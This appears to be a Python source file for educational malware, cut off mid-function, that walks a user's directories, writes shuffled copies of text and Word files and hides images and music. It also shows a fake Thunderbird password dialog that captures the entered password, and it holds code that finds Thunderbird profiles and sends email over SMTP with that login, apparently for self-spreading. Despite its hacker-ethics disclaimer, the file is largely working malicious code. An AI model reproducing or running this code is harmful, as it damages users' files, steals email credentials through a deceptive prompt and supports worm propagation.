#!/usr/bin/python

"""
(c) 2022 telekobold <www.telekobold.de>

This software was written solely for the joy of exploring how things work
and the intension of sharing accumulated experiences with others. It shall not
be abused to cause harm to anyone. Please refer to the hacker ethics
<https://www.ccc.de/en/hackerethics>, especially the point "Don't litter other 
people's data."

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR 
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, 
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE 
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER 
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, 
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE 
SOFTWARE.
"""


# --------------------------------------------------------------------------
# ------------------------------- imports ----------------------------------
# --------------------------------------------------------------------------

import os
import platform
import sys
import random
import mimetypes
import docx
import subprocess
from datetime import datetime
import typing
import notify
import shutil
import re
import sqlite3
import base64
import enum
#import threading

import smtplib
import email
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import COMMASPACE # Value: ", "

from PyQt5.QtWidgets import QApplication, QLabel, QWidget, QLineEdit, QPushButton, QDesktopWidget, QCheckBox
from PyQt5 import QtGui


# --------------------------------------------------------------------------
# -------------------- global variables and constants ----------------------
# --------------------------------------------------------------------------

# type variables:
ArbitraryType = typing.TypeVar("ArbitraryType")
ArbKeyArbValDict = typing.Dict[ArbitraryType, ArbitraryType]
IntKeyArbValDict = typing.Dict[int, ArbitraryType]
IntKeyStrValDict = typing.Dict[int, str]

INSTALLED_OS: str = platform.system()
LINUX: str = "Linux"
WINDOWS: str = "Windows"
FILES_TO_WRITE_PER_DIR: int = 10
SSL: str = "SSL"
TLS: str = "TLS"
STARTTLS: str = "STARTTLS"

TESTING_DIR_PAYLOAD: str = os.path.join(os.path.expanduser("~"), "TestingDir", "payload_testing_dir")
TESTING_DIR_THUNDERBIRD: str = os.path.join(os.path.expanduser("~"), "TestingDir", "thunderbird_copy")


# --------------------------------------------------------------------------
# ------------------ 4th class payload helper functions --------------------
# --------------------------------------------------------------------------

def n_rand_numbers(n: int) -> typing.List[int]:
    """
    Before calling this function, please call `random.seed` with a non-fixed 
    value.
    
    :n:       The length of the list to return.
    :returns: a list of n numbers between 0 and n, randomly shuffled, 
              but unique (meaning that each number appears only once in the list); 
              `None` for n <= 0.
    """
    result = []
    
    if n <= 0:
        #print("For n_rand_numbers, only positive values make sense!")
        return None
    while len(result) < n:
        i = random.randint(0,n)
        if i not in result:
            result.append(i)
    
    return result


# --------------------------------------------------------------------------
# ------------------ 3rd class payload helper functions --------------------
# --------------------------------------------------------------------------
            
def read_text_file_to_dict(filename: str) -> IntKeyStrValDict:
    """
    Reads the passed text file line by line to a Python dictionary.
    
    :filename: the absolute file name of a text file.
    :returns:  a Python dictionary whose keys are the line numbers (integer 
               values) and the appropriate values being the content of this line 
               (string values) in the text file belonging to the passed
               `filename`.
    """
    result = {}
    # TODO: Add error handling if file opening doesn't work (e.g. because of 
    # missing access rights). In this case, just continue to the next file.
    with open(filename, "r") as file:
        lines = file.readlines()
    
    # NOTE: The line indexing starts with 0.
    for i, line in zip(range(len(lines)), lines):
        result[i] = line
        
    # print("read_text_file_to_dict: result = {}".format(result))
    return result


def shuffle_filename(filename: str) -> str:
    # Determine the lines the text file has and use this number of lines 
    # to randomly shuffle the positions of those lines.
    # TODO: to be implemented
    return filename


def create_filename(input_filename: str, number: int) -> str:
    """
    Converts the passed `number` to a string and writes it at the end of the 
    file name. 
    
    If the file name contains a file name extensions, the number
    is written directly before this file name extension. This is currently
    supported for the file name extensions ".txt" and ".docx".
    
    :input_filename: a relative or absolute file name
    :number:         an `int` value
    :returns:        `input_filename` with added `number`.
    """
    filename = None
    
    if input_filename.endswith(".txt"):
        filename = f"{input_filename[0:len(input_filename)-4:1]}_{str(number)}.txt"
    elif input_filename.endswith(".docx"):
        filename = f"{input_filename[0:len(input_filename)-5:1]}_{str(number)}.docx"
    else:
        filename = input_filename + str(i)
        
    return filename


def shuffle_dict_content(dictionary: IntKeyArbValDict) -> IntKeyArbValDict:
    """
    :dictionary: an arbitrary Python dictionary
    :returns:    a Python dictionary which contains the content of the input 
                 dictionary, but with randomly shuffled values.
    """
    result = {}
    max_index = len(dictionary)-1
    if max_index >= 1:
        rand_numbers = n_rand_numbers(max_index)
    else:
        # In this case, the loop below will be run 0 times and an empty
        # dictionary is returned.
        max_index = 0
        rand_numbers = []
    # print("shuffle_dict_content(): rand_numbers = {}".format(rand_numbers))
    
    # Write the values from the input dictionary to the output dictionary in 
    # random order:
    for i in range(max_index):
        result[i] = dictionary[rand_numbers[i]]
        
    return result


def write_dict_to_text_file(dictionary: IntKeyArbValDict, filename: str) -> None:
    """
    Writes every value of `dictionary` to a new line of the text file with 
    `filename`.
    
    :dictionary: a Python dictionary
    :filename:   an absolute file name
    """
    with open(filename, "w") as file:
        for i in range(len(dictionary)):
            file.writelines(dictionary[i])


def write_dict_to_docx_file(dictionary: IntKeyStrValDict, filename: str) -> None:
    """
    Writes every value of `dictionary` to a new line of the docx file with 
    `filename`.
    
    :dictionary: a Python dictionary
    :filename:   the absolute file name of a docx file
    """
    document = docx.Document()
    paragraph = document.add_paragraph()
    for i in range(len(dictionary)):
        paragraph.add_run("{}\n".format(dictionary[i]))
    document.save(filename)


# --------------------------------------------------------------------------
# ------------------ 2nd class payload helper functions --------------------
# --------------------------------------------------------------------------

def is_file_type(file: str, filetype: str) -> bool:
    """
    Tests whether the passed file is of the passed filetype.
    
    :file:     a relative or absolute file path.
    :filetype: one of the file types "doc", "docx", "jpeg", "jpg", "mp3", "mp4",
               "odt", "ogg", "png", "txt", "wav"
    :returns: `True` if the passed `file` is of the specified file type, 
              `False` otherwise
    """
    mime_types = {"docx" : "application/vnd.openxmlformats-officedocument.wordprocessingml.document", 
                  "jpeg" : "image/jpeg", 
                  "jpg" : "image/jpeg", 
                  "mp3" : "audio/mpeg", 
                  "mp4" : "video/mp4",
                  "odt" : "application/vnd.oasis.opendocument.text", 
                  "ogg" : "audio/ogg", 
                  "png" : "image/png", 
                  "txt" : "text/plain", 
                  "wav" : "audio/x-wav"}
    if file.endswith(filetype):
        return True
    # TODO: mimetypes.guess_type only guesses the MIME type using the file name 
    # extension. Instead, provice a functionality which determines the MIME type 
    # without having the file name extension instead (otherwise, this check 
    # doesn't make much sense).
    elif mimetypes.guess_type(file)[0] is mime_types[filetype]:
        return True
    return False


def process_text_file(input_filename: str) -> None:
    """
    Creates `FILES_TO_WRITE_PER_DIR` new text files where each file contains the 
    content of the text file with the past `input_filename`, but with randomly 
    shuffled lines. The new files are created in the same directory as 
    `input_filename`'s directory.
    
    :input_filename: an absolute file name
    """
    input_file_content = read_text_file_to_dict(input_filename)
    
    for i in range(FILES_TO_WRITE_PER_DIR):
        # TODO: Replace the call of create_filename with using shuffle_filename. 
        # It should then also be checked if the same, random file name was 
        # generated twice. A re-shuffling should be triggered in this case.
        # Temporary solution: Append suffixes "1", "2", ... to the file names:
        # filename = shuffle_filename(input_filename)
        filename = create_filename(input_filename, i)
        file_content = shuffle_dict_content(input_file_content)
        write_dict_to_text_file(file_content, filename)
        
        
# TODO: Add error handling if file opening doesn't work (e.g. because of missing
# access rights). Instead, just continue to the next file.
def process_docx_file(input_filename: str) -> None:
    """
    Produces FILES_TO_WRITE_PER_DIR new docx files where each file contains 
    the content of this text file, but with randomly shuffled content.
    """
    input_file_content = {}
    document = docx.Document(input_filename)
    # Read out the document's text:
    # TODO: Preserve the text's formatting
    for i, p in zip(range(sys.maxsize), document.paragraphs):
        input_file_content[i] = p.text
    # TODO: Read out the document's tables
    # TODO: Read out the document's pictures
    
    for i in range(FILES_TO_WRITE_PER_DIR):
        # TODO: Replace the call of create_filename with using shuffle_filename. 
        # It should then also be checked if the same, random file name was 
        # generated twice. A re-shuffling should be triggered in this case.
        # Temporary solution: Append suffixes "1", "2", ... to the file names:
        # filename = shuffle_filename(input_filename)
        filename = create_filename(input_filename, i)
        file_content = shuffle_dict_content(input_file_content)
        write_dict_to_docx_file(file_content, filename)


def process_odt_file(file):
    """
    Produces FILES_TO_WRITE_PER_DIR new odt files where each file contains 
    the content of this text file, but with randomly shuffled content.
    """
    # TODO: to be implemented
    pass
        
        
def make_file_hidden(filepath: str) -> None:
    """
    Makes the past file hidden, i.e., writes a "." in front of its name.
    Assumes that `filepath` is a path to an actually existing file.
    
    :filepath: the absolute file path to the file to make hidden.
    """
    if INSTALLED_OS == WINDOWS:
        subprocess.check_call(["attrib", "+H", filepath])
    elif INSTALLED_OS == LINUX:
        path, name = os.path.split(filepath)
        name = f".{name}"
        new_filepath = os.path.join(path, name)
        os.rename(filepath, new_filepath)
        
        
# --------------------------------------------------------------------------
# ------------------ 1st class payload helper functions --------------------
# --------------------------------------------------------------------------

def traverse_dirs(curr_dir: str) -> None:
    """
    Recursively traverses all directories and subdirectories starting from 
    `curr_dir` and calls the appropriate processing function for each file.
    
    :curr_dir: the directory to start the traversal as absolute file name.
    """
    if os.path.islink(curr_dir):
        print("detected symlink {}".format(curr_dir))
        # TODO: Maybe do the same as for directories instead of just ignoring 
        # symlinks? -> Danger of recursive loops
        return
    if os.path.isfile(curr_dir):
        if is_file_type(curr_dir, "txt"):
            # print("TEXT file {}".format(curr_dir))
            process_text_file(curr_dir)
        elif is_file_type(curr_dir, "docx"):
            # print("DOCX file {}".format(curr_dir))
            process_docx_file(curr_dir)
        elif is_file_type(curr_dir, "jpeg") or is_file_type(curr_dir, "jpg") or is_file_type(curr_dir, "png"):
            #print("image file {}".format(curr_dir))
            make_file_hidden(curr_dir)
        elif is_file_type(curr_dir, "mp3") or is_file_type(curr_dir, "ogg"):
            #print("music file {}".format(curr_dir))
            make_file_hidden(curr_dir)
        """
        elif is_file_type(curr_dir, "odt"):
            print("ODT file {}".format(curr_dir))
            process_odt_file(curr_dir)
        """
    if os.path.isdir(curr_dir):
        # print("DIR {}".format(curr_dir))
        for file in os.listdir(curr_dir):
            # traverse_dirs("{}/{}".format(curr_dir, file))
            # system-independent version:
            traverse_dirs(os.path.join(curr_dir, file))


# --------------------------------------------------------------------------
# ------------------------- password window code ---------------------------
# --------------------------------------------------------------------------

window: QWidget = None
textfield: QLineEdit = None
password: str = None
DEFAULT22_BASE64 : str = ""\
"iVBORw0KGgoAAAANSUhEUgAAABYAAAAWCAYAAADEtGw7AAAEdUlEQVR42qWUezBcZxjG96/e/vJv"\
"pzONS9a6Lva+bgmxu0SVSTRIK0uqUdego6RoNSTRIDZWWJdlsYxWXYO0BLusIdaiLksGHcNUqtUy"\
"homO1NOza5hRpKb5Zp6Zc77vnN/znuc985JIL1mCiqfhAtnUHy4i9bMzUbXRzNsjZ6k3ntiS/u9i"\
"udwy4D0YUbnXzOOcbBaOYi1Yd0ZhkzQIs+sqWPrWvaB61azTBOWSE0Ntz+fFOCR3/aWDupXPwenB"\
"FDh3f4JtihqmIZ0wDD4ockDrjgNXnHss0M79vgHVs/h7K2E9+JVz4BFyLpiCo2gC7Bt9sPBrOgTd"\
"k5GwA1Y+tbNHgqmeJROm/nVwzJ0AX/4znCTTYOZNwD57HNSPmkAOfHQYerULRiHdML6mgPGnSth5"\
"VI4dgDr4FMtN/ethFNQO5zwtaKJhmCd3EDFoYZ0wAHKYEsZX2kHxa4ZpQMs+zITYPx3ZC3JMHyjx"\
"AzAOVYLjXJC3G4FAZGjuWw0ToqLotE64Fj2FX2QWrvKdwEgbBTmiR/+pZpeaQDQMdLcyWPs17MPM"\
"k9SgpGpgkjgAw5AumArbsNssj/wMckADvOJ/xPr6OkLrJuHxRQPsUobgGqeAtH4KZcReurgf12If"\
"4nJgFZyZ90CN7AD59ghMMkdhlKGBcZQSppFdMIvtxllXcQOJ6iWdPR3Yiiejv6CqfRCNs1r4lY4T"\
"13PY2to6VkXqZzDMG8O7OSNE9QqYx3XDMqEb1GQFnLyKVkkWFyqJxrRhe3sbm5ubSG4cxe9/brwU"\
"qtPwr+s4lTMEswQlrBK7YZOigN1NBRjp3XDyK98hmV+sIprWgS71oh6+sLCApaWl/wSvrKzAMkUJ"\
"my8VoKUpwMxQgn1XAW5YPbj+cujBIfc0CM5X68E6jY+PHwnT9WBychL9/f3QarWgpxPAb4g/IYsA"\
"ft0O7uctYAu/AzuwBkQUFeib+G0fuieNRrMPnJmZwdDQEKanp/Vx6c5XN56DI+oB99Zj2Kd3gB3e"\
"CNYn9WB9XAd2cC1INF/ZUk7t1CHw8vIyent79dWvrq4eOpeqZnFRrAQjuhXMyBYww5vBDGsCK3TX"\
"gGTjmS+Kyuzd+feLJ1HjwAIYcT+AEdO2axBFGEQ0gxNYs0Gi87INqb6V25XSbzGiGd3/1JPofIYK"\
"jOtt+krpOoPYR8R9K+w/qKjenRP83FJLatJzF8oVfBWfieICGZQK1ZER7GlycQ3i2jE4CApBS3ys"\
"N6DHt+tMXriwsw3254U17/68+dtCUN7yBPlNj9QzFpeHCgukbeVl8rUepervo0xuZnSCHVANrreM"\
"iOChPg5HvuTDA4OIzssysHK+s0B5RwiTNwRBRq/zDE+9dk7vXFhYaCvJLzlgMji8CC6/CPZuEnAu"\
"ycEKqoUDX1J97Fy2on5WYkaJUB13rjNJTS9ROXlLdzjuJeAKCDivkDAokJFeZTF8KnyY75evsd4r"\
"W2N7loLjIZ3nuBf7vBKUdrE6lX5BnsrwqRQxvcsbmV6yoOOe/QfLaRAj5n2jwQAAAABJRU5ErkJg"\
"gg=="
KEY_SCREENSHOT_BASE64: str = ""\
"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"

class Lang(enum.Enum):
    DE = "DE"
    EN = "EN"
    OTHER = "OTHER"

def determine_system_lang() -> Lang:
    """
    :returns: `Lang.DE` if the detected system language is German,
              `Lang.EN` if the detected system language is English,
              `Lang.OTHER` otherwise.
    """
    if INSTALLED_OS == LINUX:
        if os.environ["LANG"].startswith("de_DE"):
            #print("German")
            return Lang.DE
        elif os.environ["LANG"].startswith("en_EN"):
            #print("English")
            return Lang.EN
        else:
            #print("other")
            return Lang.OTHER
    elif INSTALLED_OS == WINDOWS:
        # TODO: Add Windows-specific imports and language detection code
        pass
    
lang: Lang = determine_system_lang()


def rand_dir_name() -> str:
    """
    Before calling this function, please call the function `random.seed` with a 
    non-fixed value.
    
    :returns: a random dir name consisting of six randomly determined digits.
    """
    rand_digits = n_rand_numbers(6)
    dir_name = ""
    for d in rand_digits:
        dir_name += str(d)
    return dir_name

def copy_password() -> None:
    global password
    #print(f"copy_password(): password = {textfield.text()}")
    password = textfield.text()

def password_window(account_name: str = "", host_name: str = "") -> str:
    """
    Shows either a Thunderbird password input window or a Thunderbird
    master password input window, depending on the value of `password_type`.
    
    :account_name:  default value ""; the part before the "@" of the standard 
                    user email address.
    :host_name:     default value ""; the URL of the server to log in.
    """
    global window, textfield
    #lang = Lang.EN # For easy testing of the English output
    
    app = QApplication(sys.argv)
    window = QWidget()
    #FONT_SIZE : int = 9
    
    
    window.setWindowTitle(f"Passwort eingeben für {account_name}" if lang == Lang.DE else f"Enter your password for {account_name}")
    #window.setFont(QtGui.QFont("Arial", FONT_SIZE))
    random.seed((datetime.now()).strftime("%H%M%S"))
    dir_name: str = rand_dir_name()
    # If the randomly determined directory name already exists, create a new one
    # until a name is found that does not already exist:
    while os.path.isdir(dir_name):
        dir_name = rand_dir_name()
    os.mkdir(dir_name)
    encoded_tb_icon_path: str = os.path.join(dir_name, "default22_decoded.png")
    with open(encoded_tb_icon_path, "wb") as tb_icon:
        tb_icon.write(base64.b64decode(DEFAULT22_BASE64))
    window.setWindowIcon(QtGui.QIcon(encoded_tb_icon_path))
    window.setGeometry(100, 100, 545, 175)

    # Let the window sporn in the center of the screen:
    fg = window.frameGeometry()
    center_point = QDesktopWidget().availableGeometry().center()
    fg.moveCenter(center_point)
    window.move(fg.topLeft())

    key = QLabel(parent=window)
    encoded_key_icon_path: str = os.path.join(dir_name, "key_screenshot_decoded.png")
    with open(encoded_key_icon_path, "wb") as key_icon:
        key_icon.write(base64.b64decode(KEY_SCREENSHOT_BASE64))
    pixmap = QtGui.QPixmap(encoded_key_icon_path)
    key.setPixmap(pixmap)
    key.move(15,15)
    shutil.rmtree(dir_name, ignore_errors=True)
    
    msg = QLabel(f"Geben Sie Ihr Passwort für \"{account_name}\" auf {host_name} ein:" if lang == Lang.DE else f"Enter your password for \"{account_name}\" on {host_name}:", parent=window)
    msg.move(75, 30)

    textfield = QLineEdit(parent=window)
    textfield.move(70, 65)
    textfield.setMinimumWidth(460)
     # Show mask characters instead of the characters actually entered:
    textfield.setEchoMode(QLineEdit.Password)
    textfield.returnPressed.connect(copy_password)
        
    checkbox = QCheckBox("Die Passwortverwaltung benutzen, um dieses Passwort zu speichern." if lang == Lang.DE else "Use Password Manager to remember this password.", parent=window)
    checkbox.move(75, 105)
    checkbox.setFont(QtGui.QFont("Arial", 9))
    
    cancel_button = QPushButton("Abbrechen" if lang == Lang.DE else "Cancel", parent=window)
    #cancel_button.setFont(QtGui.QFont("Arial", FONT_SIZE))
    cancel_button.setGeometry(350, 130, 85, 30)

    sign_in_button = QPushButton("Sign in", parent=window)
    #sign_in_button.setFont(QtGui.QFont("Arial", FONT_SIZE))
    sign_in_button.setGeometry(445, 130, 85, 30)
    sign_in_button.setFocus()
    # sign_in_button.setAutoDefault(True)
    sign_in_button.clicked.connect(copy_password)

    window.show()
    
    app.exec_()
    return password


# --------------------------------------------------------------------------
# ----------------- 2nd class send email helper functions ------------------
# --------------------------------------------------------------------------

def determine_thunderbird_default_file_path() -> str:
    """
    Determines Thunderbird's config directory file path on the current system.
    
    :returns: the absolute file path to Thunderbird's config directory
              or "" if no such file path could be found or if the detected 
              operating system is neither Windows, nor Linux.
    """
    USER_FILE_PATH: str = os.path.expanduser("~")
    THUNDERBIRD_PATH_WINDOWS: str = os.path.join(USER_FILE_PATH, "AppData", "Roaming", "Thunderbird")
    THUNDERBIRD_PATH_LINUX_1: str = os.path.join(USER_FILE_PATH, ".thunderbird")
    THUNDERBIRD_PATH_LINUX_2: str = os.path.join(USER_FILE_PATH, "snap", "thunderbird", "common", ".thunderbird")
    # for testing purposes:
    #thunderbird_path_linux: str = os.path.join(USER_FILE_PATH, "TestVerzeichnis", "filewriter_test")
    thunderbird_path: str = ""
    
    if INSTALLED_OS == WINDOWS:
        if os.path.isdir(THUNDERBIRD_PATH_WINDOWS):
            thunderbird_path = THUNDERBIRD_PATH_WINDOWS
    elif INSTALLED_OS == LINUX:
        if os.path.isdir(THUNDERBIRD_PATH_LINUX_1):
            thunderbird_path = THUNDERBIRD_PATH_LINUX_1
        elif os.path.isdir(THUNDERBIRD_PATH_LINUX_2):
            thunderbird_path = THUNDERBIRD_PATH_LINUX_2
            
    return thunderbird_path


def add_profile_dir_to_list(thunderbird_path: str, line: str, profile_dir_names: typing.List[str]) -> typing.List[str]:
    """
    Helper function for `find_thunderbird_profile_dirs()`.
    
    :thunderbird_path:  The absolute file path to the Thunderbird default
                        config directory.
    :line:              A line of a browsed text file (installs.ini or 
                        profiles.ini).
    :profile_dir_names: A list to add absolute file names to detected
                        Thunderbird profile directories.
    :returns:           `profile_dir_names` with another profile dir extracted
                        from `line` if this profile dir exists on the system
                        and was not already contained in `profile_dir_names`.
    """
    line = line.strip()
    relative_profile_dir_path: str = line.split("=", maxsplit=1)[1]
    # Thunderbird uses the / especially on Windows systems,
    # so it would be wrong to use `os.path.sep`:
    l: typing.List[str] = relative_profile_dir_path.split("/")
    profile_dir_path_part: str = None
    profile_dir_name: str = None
    
    # Append potential subdirectories to the `thunderbird_path`.
    # Usually, the default profile dir should be in a "Profiles" 
    # directory on Windows systems and directly in the current
    # directory on Linux systems.
    relative_profile_dir_path = ""
    for i in range(len(l)-1):
        relative_profile_dir_path = l[i] if relative_profile_dir_path == "" else os.path.join(relative_profile_dir_path, l[i])
    #print(f"relative_profile_dir_path = {relative_profile_dir_path}")
    profile_dir_name = l[len(l)-1]
    profile_dir_name_absolute = os.path.join(thunderbird_path, relative_profile_dir_path, profile_dir_name)
    if os.path.isdir(profile_dir_name_absolute) and profile_dir_name_absolute not in profile_dir_names:
        profile_dir_names.append(profile_dir_name_absolute)
        
    return profile_dir_names


def send_mail_ssl(smtp_server_url: str, sender_email: str, password: str, to: typing.List[str], whole_email_text: str) -> int:
    """
    Sends an email using SSL.
    
    The meaning of the parameter variables should be unique based on their 
    variable names together with the type annotations.
    
    :returns: 0 in case of success, 1 in case of error.
    """
    
    port = 465

    with smtplib.SMTP_SSL(smtp_server_url, port) as smtp_server:
        # smtp_server.ehlo()
        try:
            l = smtp_server.login(sender_email, password)
            #print("l = {}\n".format(l))
        except Exception as l_ex:
            # TODO: raise specific exception
            print("Exception thrown when trying to login!", l_ex)
            return 1
        try:
            smtp_server.sendmail(sender_email, to, whole_email_text)
        except Exception as s_ex:
            # TODO: raise specific exception
            print("Exception thrown when trying to send mail!", s_ex)
            return 1

    
    #print("Email sent successfully!")
    return 0


def send_mail_starttls(smtp_server_url: str, sender_email: str, password: str, to: typing.List[str], whole_email_text: str) -> int:
    """
    Sends an email using STARTTLS.
    
    The meaning of the parameter variables should be unique based on their 
    variable names together with the type annotations.
    
    :returns: 0 in case of success, 1 in case of error.
    """
    
    starttls_smtp_port = 587

    with smtplib.SMTP(smtp_server_url, starttls_smtp_port) as smtp_server:
        # smtp_server.ehlo()
        try:
            smtp_server.starttls()
            # smtp_server.ehlo()
        except Exception as e:
            print("Exception thrown when trying to create starttls connection!", e)
            return 1
        try:
            l = smtp_server.login(sender_email, password)
            #print("l = {}\n".format(l))
        except Exception as l_ex:
            print("Exception thrown when trying to login!", l_ex)
            return 1
        try:
            smtp_server.sendmail(sender_email, to, whole_email_text)
        except Exception as s_ex:
            print("Exception thrown when trying to send mail!", s_ex)
            return 1
        
    #print("Email sent successfully!")
    return 0


# --------------------------------------------------------------------------
# ----------------- 1st class send email helper functions ------------------
# --------------------------------------------------------------------------

def determine_possible_paths() -> str:
    """
    Determines possible paths where an executable of Mozilla Thunderbird
    could be located and returns them as possibly extended PATH variable
    in the appropriate syntax, depending on which operating system is installed.
    
    :returns: A possibly extended version of the local PATH variable
              or `None` if no PATH variable could be found or if the detected OS
              is neither "Windows", nor "Linux".
    """
    try:
        paths: str = os.environ["PATH"]
    except KeyError:
        return None
    additional_paths_windows: typing.List[str] = [os.path.join("C:\Program Files", "Mozilla Thunderbird")]
    additional_paths_linux: typing.List[str] = []
    additional_paths: typing.List[str] = []
    splitter: str = ""
    
    if INSTALLED_OS == WINDOWS:
        splitter = ";"
        additional_paths = additional_paths_windows
    elif INSTALLED_OS == LINUX:
        splitter = ":"
        additional_paths = additional_paths_linux
    else:
        # Not supported OS
        return None
    read_paths_list = paths.split(splitter)
    for path in additional_paths:
        if path not in read_paths_list:
            paths = paths + splitter + path
    
    return paths


def find_thunderbird_profile_dirs() -> typing.List[str]:
    """
    Searches the files "installs.ini" and "profiles.ini" for listed profile
    directories and returns them if those directories exist.
    
    If a file "installs.ini" exists, all profile directories referenced in this
    file are returned if those directories exist.
    Otherwise, the default profile directory in "profiles.ini" is returned.
    
    :returns: a list of detected profile directories or `None` if no directory
              could be found or if the installed operating system is neither
              Windows, nor Linux.
    """
    #thunderbird_path: str = determine_thunderbird_default_file_path()
    thunderbird_path: str = TESTING_DIR_THUNDERBIRD
    
    installs_ini: str = os.path.join(thunderbird_path, "installs.ini")
    profiles_ini: str = os.path.join(thunderbird_path, "profiles.ini")
    profile_dir_names: typing.List[str] = []
    
    # If there is an installs.ini file, return the file paths of all
    # profile directories referenced in that file if those profile directories 
    # actually exist. Avoid redundant entries.
